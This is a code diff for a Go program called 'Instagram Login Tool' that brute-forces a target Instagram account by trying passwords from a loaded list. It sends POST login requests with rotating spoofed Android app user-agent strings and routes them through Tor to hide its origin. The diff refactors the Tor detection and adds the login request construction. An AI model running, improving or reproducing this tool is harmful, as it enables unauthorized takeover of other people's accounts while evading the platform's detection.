@@ -25,19 +25,16 @@ const (
 )
 
 var userAgents = []string{
-	//"Instagram 76.0.0.15.395 Android (24/7.0; 640dpi; 1440x2560; samsung; SM-G930F; herolte; samsungexynos8890; en_US; 138226743",
-       // "Instagram 141.0.0.17.118 Android (29/10; 450dpi; 1080x2192; samsung; SM-G986U; y2q; qcom; en_US; 213368022)",
 	"Instagram 329.0.0.29.120 Android (31/12; 420dpi; 1080x2400; samsung; SM-A515F; a51; exynos9611; en_US; 329000029)",
 	"Instagram 328.0.0.13.119 Android (31/12; 480dpi; 1080x2400; samsung; SM-A715F; a71; qcom; en_US; 328000013)",
-        "Instagram 330.0.0.23.108 Android (31/12; 480dpi; 1080x2400; samsung; SM-A525F; a52; qcom; en_US; 330002310)",
-        "Instagram 330.0.0.23.108 Android (30/11; 420dpi; 1080x2340; Xiaomi; M2007J20CG; gauguin; qcom; en_US; 330002310)",
-        "Instagram 327.0.0.20.123 Android (30/11; 420dpi; 1080x2400; realme; RMX3371; RMX3371; qcom; en_US; 327000020)",
-        "Instagram 372.0.0.48.60 Android (34/14; 450dpi; 1080x2222; samsung; SM-S928N; e3q; qcom; vi_VN; 709818009)",
-        "Instagram 352.1.0.41.100 Android (31/12; 420dpi; 1080x2047; samsung; SM-G975F; beyond2; exynos9820; in_ID; 650753877)",
-        "Instagram 350.1.0.46.93 Android (31/12; 480dpi; 1080x2051; samsung; SM-N976N; d2x; exynos9825; ko_KR; 645441462)",
-        "Instagram 357.1.0.52.100 Android (34/14; 450dpi; 1080x2127; samsung; SM-S926N; e2s; s5e9945; ko_KR; 662944209)",
-        "Instagram 349.3.0.42.104 Android (34/14; 420dpi; 1080x2133; samsung; SM-S911N; dm1q; qcom; ko_KR; 643237792)",
-
+	"Instagram 330.0.0.23.108 Android (31/12; 480dpi; 1080x2400; samsung; SM-A525F; a52; qcom; en_US; 330002310)",
+	"Instagram 330.0.0.23.108 Android (30/11; 420dpi; 1080x2340; Xiaomi; M2007J20CG; gauguin; qcom; en_US; 330002310)",
+	"Instagram 327.0.0.20.123 Android (30/11; 420dpi; 1080x2400; realme; RMX3371; RMX3371; qcom; en_US; 327000020)",
+	"Instagram 372.0.0.48.60 Android (34/14; 450dpi; 1080x2222; samsung; SM-S928N; e3q; qcom; vi_VN; 709818009)",
+	"Instagram 352.1.0.41.100 Android (31/12; 420dpi; 1080x2047; samsung; SM-G975F; beyond2; exynos9820; in_ID; 650753877)",
+	"Instagram 350.1.0.46.93 Android (31/12; 480dpi; 1080x2051; samsung; SM-N976N; d2x; exynos9825; ko_KR; 645441462)",
+	"Instagram 357.1.0.52.100 Android (34/14; 450dpi; 1080x2127; samsung; SM-S926N; e2s; s5e9945; ko_KR; 662944209)",
+	"Instagram 349.3.0.42.104 Android (34/14; 420dpi; 1080x2133; samsung; SM-S911N; dm1q; qcom; ko_KR; 643237792)",
 }
 
 type InstagramResponse struct {
@@ -72,45 +69,39 @@ func clearTerminal() {
 
 func main() {
 	clearTerminal()
-
 	setupLogger()
 	fmt.Println(" ***Instagram Login Tool*** ")
 	fmt.Printf("coded by: %s\n\n", CURRENT_USER)
 	fmt.Println("Checking Public IPs...\n")
-	ipDirect, err := getPublicIP(&http.Client{Timeout: 10 * time.Second})
-	if err != nil {
-		fmt.Println("Error getting direct IP:", err)
+
+	ipDirect, errDirect := getPublicIP(&http.Client{Timeout: 10 * time.Second})
+	ipTor, torOK := getTorIP()
+
+	if errDirect != nil {
+		fmt.Println("Error getting direct IP:", errDirect)
 	} else {
 		fmt.Println("[Direct] Public IP:", ipDirect)
 	}
 
-	ipTor, torOK := getTorIP()
 	if torOK {
 		fmt.Println("[TOR]    Public IP:", ipTor)
-		if ipDirect != ipTor {
+		if errDirect == nil && ipDirect != ipTor {
 			fmt.Println("TOR is working (IP changed)\n")
 		} else {
 			fmt.Println("TOR is NOT working (IP did not change)\n")
 		}
-	        } else {
+	} else {
 		fmt.Println("[TOR]    Unable to connect through TOR. (TOR is NOT working)\n")
-	        }
-	useTor := false
-	if torOK {
-		useTor = true
 	}
 
-useTor := false
-dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, proxy.Direct)
-if err == nil {
-    useTor = true
-}
+	// فقط یک بار انتخاب اتصال
+	useTor := torOK
 
-if useTor {
-    fmt.Println("The connection was established via TOR.\n")
-} else {
-    fmt.Println("TOR is not enabled, direct connection is used.\n")
-}
+	if useTor {
+		fmt.Println("The connection was established via TOR.\n")
+	} else {
+		fmt.Println("The connection was established directly (or via VPN).\n")
+	}
 
 	username := getUsername()
 	passwords := loadPasswords()
@@ -261,6 +252,12 @@ func tryLogin(username, password string, useTor bool) LoginResult {
 		}
 	} else {
 		client = &http.Client{Timeout: TIMEOUT}
+	}
+
+	req, err := http.NewRequest("POST", loginUrl, strings.NewReader(data.Encode()))
+	if err != nil {
+		log.Printf("Error creating request: %v\n", err)
+		return LoginResult{Username: username, Password: password, Success: false, Time: time.Now().Format("2006-01-02 15:04:05"), Message: "Request error"}
 	}
 
 	req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
